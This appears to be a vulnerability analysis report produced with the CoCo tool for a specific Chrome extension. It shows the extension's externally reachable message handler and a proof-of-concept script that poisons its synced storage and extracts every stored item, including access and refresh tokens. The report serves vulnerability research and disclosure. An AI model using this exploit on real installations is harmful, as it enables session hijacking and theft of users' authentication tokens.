# CoCo Analysis: oehoffnnkgcdacmbkhmlbjedinpampak

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** Multiple (storage poisoning + information disclosure)

---

## Sink 1: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/oehoffnnkgcdacmbkhmlbjedinpampak/opgen_generated_files/bg.js
Line 965: chrome.runtime.onMessageExternal.addListener

**Code:**

```javascript
// Background script (bg.js Line 965) - Deobfuscated
function messageHandler(request, sender, sendResponse) {
    // Storage write operations
    if (request.message.type === "updateStorage") {
        chrome.storage.sync.set(request.message.payload); // ← Attacker-controlled payload
    }

    if (request.message.type === "setAccessToken") {
        chrome.storage.sync.set({accessToken: request.message.payload}); // ← Attacker-controlled token
    }

    if (request.message.type === "setRefreshToken") {
        chrome.storage.sync.set({refreshToken: request.message.payload}); // ← Attacker-controlled token
    }

    if (request.message.type === "setStorage") {
        chrome.storage.sync.set(request.message.payload, result => {
            sendResponse(result); // ← Sends confirmation back
        });
    }

    // Storage read operation
    if (request.message.type === "getStorage") {
        chrome.storage.sync.get(null, allData => {
            sendResponse(allData); // ← Sends ALL storage data back to attacker
        });
    }
}

chrome.runtime.onMessage.addListener(messageHandler);
chrome.runtime.onMessageExternal.addListener(messageHandler); // ← External messages accepted
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// Attacker website or extension sends external message to poison storage
chrome.runtime.sendMessage('oehoffnnkgcdacmbkhmlbjedinpampak', {
    message: {
        type: 'updateStorage',
        payload: {
            malicious_key: 'malicious_value',
            user_preference: 'attacker_controlled'
        }
    }
}, function(response) {
    console.log('Storage poisoned successfully');
});

// Alternative: Set access token
chrome.runtime.sendMessage('oehoffnnkgcdacmbkhmlbjedinpampak', {
    message: {
        type: 'setAccessToken',
        payload: 'attacker_fake_token'
    }
});

// Attacker retrieves all stored data (information disclosure)
chrome.runtime.sendMessage('oehoffnnkgcdacmbkhmlbjedinpampak', {
    message: {
        type: 'getStorage'
    }
}, function(allStorageData) {
    console.log('Stolen all extension storage data:', allStorageData);
    // allStorageData contains: accessToken, refreshToken, user settings, etc.
});
```

**Impact:** Complete storage exploitation chain with information disclosure. An external attacker (from whitelisted domains or any malicious extension) can:
1. Poison chrome.storage.sync with arbitrary data including fake authentication tokens
2. Retrieve ALL stored data including legitimate user's access tokens, refresh tokens, and settings via getStorage
3. This allows session hijacking (stealing authentication tokens) and complete manipulation of extension state
4. The getStorage handler returns ALL storage data (chrome.storage.sync.get(null)) making this a severe information disclosure vulnerability

---

## Sink 2: storage_sync_get_source → sendResponseExternal_sink

This is the same vulnerability as Sink 1 - the getStorage message type creates a complete exploitation chain where storage data flows back to the external attacker.
